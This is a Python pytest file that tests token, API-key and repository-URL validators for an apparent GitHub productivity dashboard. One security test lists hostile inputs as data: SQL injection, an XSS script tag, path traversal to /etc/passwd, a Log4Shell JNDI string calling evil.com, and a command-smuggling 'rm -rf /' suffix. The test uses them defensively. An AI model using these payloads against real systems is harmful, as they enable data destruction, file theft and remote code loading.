"""
UI validation tests for GitHub Productivity Dashboard.

This module contains tests that validate the UI logic and validation functions
without requiring full Streamlit mocking.
"""

import pytest
import sys
import os

# Add the project root to the path
sys.path.insert(0, os.path.abspath('.'))

# Import validation functions
from main import validate_github_token, validate_openai_key, validate_repository_url


class TestUIValidation:
    """Test UI validation functions."""
    
    def test_github_token_validation_comprehensive(self):
        """Comprehensive test of GitHub token validation."""
        
        # Test cases: (token, expected_result, description)
        test_cases = [
            # Invalid cases
            ("", False, "Empty token"),
            (None, False, "None token"),
            ("invalid_token", False, "Invalid format"),
            ("github_pat_123", False, "Wrong prefix"),
            ("ghp_short", False, "Too short"),
            ("ghp_123", False, "Too short with valid prefix"),
            ("token_ghp_1234567890abcdef1234567890abcdef12345678", False, "Valid token in wrong position"),
            
            # Valid cases
            ("ghp_1234567890abcdef1234567890abcdef12345678", True, "Valid ghp token"),
            ("gho_1234567890abcdef1234567890abcdef12345678", True, "Valid gho token"),
            ("ghu_1234567890abcdef1234567890abcdef12345678", True, "Valid ghu token"),
            ("ghs_1234567890abcdef1234567890abcdef12345678", True, "Valid ghs token"),
            ("ghr_1234567890abcdef1234567890abcdef12345678", True, "Valid ghr token"),
            ("ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop", True, "Valid token with mixed case"),
            ("ghp_1234567890abcdef1234567890abcdef12345678_extra", True, "Valid token with extra chars"),
        ]
        
        for token, expected, description in test_cases:
            result = validate_github_token(token)
            assert result == expected, f"Failed for {description}: token='{token}', expected={expected}, got={result}"
    
    def test_openai_key_validation_comprehensive(self):
        """Comprehensive test of OpenAI API key validation."""
        
        test_cases = [
            # Invalid cases
            ("", False, "Empty key"),
            (None, False, "None key"),
            ("invalid_key", False, "Invalid format"),
            ("api_key_123", False, "Wrong prefix"),
            ("sk-short", False, "Too short"),
            ("sk-123", False, "Too short with valid prefix"),
            ("key_sk-1234567890abcdef1234567890abcdef", False, "Valid key in wrong position"),
            
            # Valid cases
            ("sk-1234567890abcdef1234567890abcdef", True, "Valid sk key"),
            ("sk-proj-1234567890abcdef1234567890abcdef", True, "Valid sk-proj key"),
            ("sk-1234567890ABCDEF1234567890abcdef", True, "Valid key with mixed case"),
            ("sk-1234567890abcdef1234567890abcdef1234567890", True, "Valid longer key"),
        ]
        
        for key, expected, description in test_cases:
            result = validate_openai_key(key)
            assert result == expected, f"Failed for {description}: key='{key}', expected={expected}, got={result}"
    
    def test_repository_url_validation_comprehensive(self):
        """Comprehensive test of repository URL validation."""
        
        test_cases = [
            # Invalid cases - should return (False, "", "")
            ("", (False, "", ""), "Empty URL"),
            (None, (False, "", ""), "None URL"),
            ("invalid-url", (False, "", ""), "Invalid format"),
            ("https://gitlab.com/owner/repo", (False, "", ""), "GitLab URL"),
            ("https://github.com/", (False, "", ""), "Incomplete GitHub URL"),
            ("https://github.com/owner", (False, "", ""), "Missing repo name"),
            ("owner", (False, "", ""), "Only owner name"),
            ("owner/", (False, "", ""), "Owner with trailing slash"),
            ("/repo", (False, "", ""), "Only repo name with slash"),
            ("owner/repo/extra", (False, "", ""), "Too many path components"),
            
            # Valid cases - should return (True, owner, repo)
            ("microsoft/vscode", (True, "microsoft", "vscode"), "Owner/repo format"),
            ("facebook/react", (True, "facebook", "react"), "Another owner/repo"),
            ("google/tensorflow", (True, "google", "tensorflow"), "Google repo"),
            ("https://github.com/microsoft/vscode", (True, "microsoft", "vscode"), "Full GitHub URL"),
            ("https://github.com/facebook/react", (True, "facebook", "react"), "Another full URL"),
            ("https://github.com/microsoft/vscode/", (True, "microsoft", "vscode"), "URL with trailing slash"),
            ("https://github.com/facebook/react.git", (True, "facebook", "react"), "URL with .git extension"),
            ("https://github.com/facebook/react.git/", (True, "facebook", "react"), "URL with .git and slash"),
            ("owner-name/repo-name", (True, "owner-name", "repo-name"), "Names with hyphens"),
            ("owner_name/repo_name", (True, "owner_name", "repo_name"), "Names with underscores"),
            ("123owner/456repo", (True, "123owner", "456repo"), "Names with numbers"),
        ]
        
        for url, expected, description in test_cases:
            result = validate_repository_url(url)
            assert result == expected, f"Failed for {description}: url='{url}', expected={expected}, got={result}"
    
    def test_validation_edge_cases(self):
        """Test edge cases for validation functions."""
        
        # Test with whitespace - GitHub and OpenAI tokens should fail with whitespace
        assert validate_github_token("  ghp_1234567890abcdef1234567890abcdef12345678  ") == False  # Whitespace should fail
        assert validate_openai_key("  sk-1234567890abcdef1234567890abcdef  ") == False  # Whitespace should fail
        
        # Test repository URL with whitespace - should succeed after stripping (good UX)
        valid, owner, name = validate_repository_url("  microsoft/vscode  ")
        assert valid == True  # Should succeed after stripping whitespace
        assert owner == "microsoft"
        assert name == "vscode"
        
        # Test very long inputs
        long_token = "ghp_" + "a" * 1000
        assert validate_github_token(long_token) == True  # Should still be valid
        
        long_key = "sk-" + "a" * 1000
        assert validate_openai_key(long_key) == True  # Should still be valid
        
        # Test special characters in repository names
        valid, owner, name = validate_repository_url("owner-123/repo_456")
        assert valid == True
        assert owner == "owner-123"
        assert name == "repo_456"
    
    def test_validation_security(self):
        """Test validation functions for security considerations."""
        
        # Test potential injection attempts
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "ghp_1234567890abcdef1234567890abcdef12345678; rm -rf /",
        ]
        
        for malicious_input in malicious_inputs:
            # GitHub token validation should reject malicious inputs
            if not malicious_input.startswith("ghp_"):
                assert validate_github_token(malicious_input) == False
            
            # OpenAI key validation should reject malicious inputs
            if not malicious_input.startswith("sk-"):
                assert validate_openai_key(malicious_input) == False
            
            # Repository URL validation should handle malicious inputs safely
            try:
                valid, owner, name = validate_repository_url(malicious_input)
                # Should not crash and should return safe values
                assert isinstance(valid, bool)
                assert isinstance(owner, str)
                assert isinstance(name, str)
            except Exception as e:
                pytest.fail(f"Repository validation crashed on malicious input '{malicious_input}': {e}")


class TestUILogic:
    """Test UI logic and flow."""
    
    def test_credential_validation_flow(self):
        """Test the complete credential validation flow."""
        
        # Step 1: Start with invalid credentials
        github_token = "invalid"
        openai_key = "invalid"
        repo_url = "invalid"
        
        github_valid = validate_github_token(github_token)
        openai_valid = validate_openai_key(openai_key)
        repo_valid, owner, name = validate_repository_url(repo_url)
        
        assert github_valid == False
        assert openai_valid == False
        assert repo_valid == False
        
        # Overall validation should fail
        credentials_valid = github_valid and repo_valid
        assert credentials_valid == False
        
        # Step 2: Fix GitHub credentials
        github_token = "ghp_1234567890abcdef1234567890abcdef12345678"
        github_valid = validate_github_token(github_token)
        assert github_valid == True
        
        # Still not fully valid
        credentials_valid = github_valid and repo_valid
        assert credentials_valid == False
        
        # Step 3: Fix repository URL
        repo_url = "microsoft/vscode"
        repo_valid, owner, name = validate_repository_url(repo_url)
        assert repo_valid == True
        assert owner == "microsoft"
        assert name == "vscode"
        
        # Now GitHub credentials should be valid
        credentials_valid = github_valid and repo_valid
        assert credentials_valid == True
        
        # Step 4: Add OpenAI key (optional)
        openai_key = "sk-1234567890abcdef1234567890abcdef"
        openai_valid = validate_openai_key(openai_key)
        assert openai_valid == True
        
        # Full validation including optional OpenAI
        full_credentials_valid = github_valid and repo_valid and openai_valid
        assert full_credentials_valid == True
    
    def test_configuration_states(self):
        """Test different configuration states."""
        
        # State 1: No configuration
        state = {
            'github_token': '',
            'repository_url': '',
            'openai_key': '',
            'github_valid': False,
            'repo_valid': False,
            'openai_valid': False
        }
        
        # Should show "Configure Credentials"
        credentials_configured = state['github_valid'] and state['repo_valid']
        assert credentials_configured == False
        
        # State 2: Partial configuration (GitHub only)
        state.update({
            'github_token': 'ghp_1234567890abcdef1234567890abcdef12345678',
            'github_valid': True
        })
        
        # Still not fully configured
        credentials_configured = state['github_valid'] and state['repo_valid']
        assert credentials_configured == False
        
        # State 3: GitHub + Repository configured
        state.update({
            'repository_url': 'microsoft/vscode',
            'repo_valid': True
        })
        
        # Now configured for basic functionality
        credentials_configured = state['github_valid'] and state['repo_valid']
        assert credentials_configured == True
        
        # State 4: Full configuration including OpenAI
        state.update({
            'openai_key': 'sk-1234567890abcdef1234567890abcdef',
            'openai_valid': True
        })
        
        # Full configuration for AI features
        full_configured = credentials_configured and state['openai_valid']
        assert full_configured == True
    
    def test_data_loading_prerequisites(self):
        """Test data loading prerequisites."""
        
        # Prerequisites for data loading
        def can_load_data(github_valid, repo_valid, github_token, repo_url):
            return (
                github_valid and 
                repo_valid and 
                github_token and 
                repo_url and
                validate_github_token(github_token) and
                validate_repository_url(repo_url)[0]
            )
        
        # Test various scenarios
        scenarios = [
            # (github_valid, repo_valid, github_token, repo_url, expected)
            (False, False, "", "", False),
            (True, False, "ghp_1234567890abcdef1234567890abcdef12345678", "", False),
            (False, True, "", "microsoft/vscode", False),
            (True, True, "ghp_1234567890abcdef1234567890abcdef12345678", "microsoft/vscode", True),
            (True, True, "invalid", "microsoft/vscode", False),  # Invalid token
            (True, True, "ghp_1234567890abcdef1234567890abcdef12345678", "invalid", False),  # Invalid repo
        ]
        
        for github_valid, repo_valid, github_token, repo_url, expected in scenarios:
            result = can_load_data(github_valid, repo_valid, github_token, repo_url)
            assert result == expected, f"Failed for scenario: {github_valid}, {repo_valid}, '{github_token}', '{repo_url}'"


class TestUIErrorHandling:
    """Test UI error handling."""
    
    def test_validation_error_messages(self):
        """Test that validation functions provide clear error indication."""
        
        # Test that validation functions return boolean values
        # that can be used to show appropriate error messages
        
        error_cases = [
            (validate_github_token, "invalid_token", "Invalid GitHub token format"),
            (validate_openai_key, "invalid_key", "Invalid OpenAI API key format"),
        ]
        
        for validator, invalid_input, expected_error_context in error_cases:
            result = validator(invalid_input)
            assert result == False, f"Validator should return False for invalid input: {invalid_input}"
        
        # Test repository URL validation error handling
        valid, owner, name = validate_repository_url("invalid_url")
        assert valid == False
        assert owner == ""
        assert name == ""
    
    def test_graceful_degradation(self):
        """Test graceful degradation when components are not available."""
        
        # Test that validation functions handle None inputs gracefully
        assert validate_github_token(None) == False
        assert validate_openai_key(None) == False
        
        valid, owner, name = validate_repository_url(None)
        assert valid == False
        assert owner == ""
        assert name == ""
        
        # Test empty string handling
        assert validate_github_token("") == False
        assert validate_openai_key("") == False
        
        valid, owner, name = validate_repository_url("")
        assert valid == False
        assert owner == ""
        assert name == ""


class TestUIPerformance:
    """Test UI performance considerations."""
    
    def test_validation_performance(self):
        """Test that validation functions perform well."""
        import time
        
        # Test with a reasonable number of validations
        test_tokens = [
            "ghp_1234567890abcdef1234567890abcdef12345678",
            "invalid_token",
            "gho_1234567890abcdef1234567890abcdef12345678",
            "",
            None
        ] * 100  # 500 validations
        
        start_time = time.time()
        for token in test_tokens:
            validate_github_token(token)
        end_time = time.time()
        
        # Should complete quickly (less than 1 second for 500 validations)
        assert end_time - start_time < 1.0, f"GitHub token validation took too long: {end_time - start_time}s"
        
        # Test repository URL validation performance
        test_urls = [
            "microsoft/vscode",
            "https://github.com/facebook/react",
            "invalid_url",
            "",
            None
        ] * 100  # 500 validations
        
        start_time = time.time()
        for url in test_urls:
            validate_repository_url(url)
        end_time = time.time()
        
        # Should complete quickly
        assert end_time - start_time < 1.0, f"Repository URL validation took too long: {end_time - start_time}s"
    
    def test_memory_usage(self):
        """Test that validation functions don't leak memory."""
        import gc
        
        # Force garbage collection
        gc.collect()
        initial_objects = len(gc.get_objects())
        
        # Perform many validations
        for i in range(1000):
            validate_github_token(f"ghp_test{i:04d}567890abcdef1234567890abcdef12345678")
            validate_openai_key(f"sk-test{i:04d}567890abcdef1234567890abcdef")
            validate_repository_url(f"owner{i}/repo{i}")
        
        # Force garbage collection again
        gc.collect()
        final_objects = len(gc.get_objects())
        
        # Should not have significantly increased object count
        object_increase = final_objects - initial_objects
        assert object_increase < 100, f"Too many objects created: {object_increase}"


if __name__ == "__main__":
    # Run tests with pytest
    pytest.main([__file__, "-v", "--tb=short"])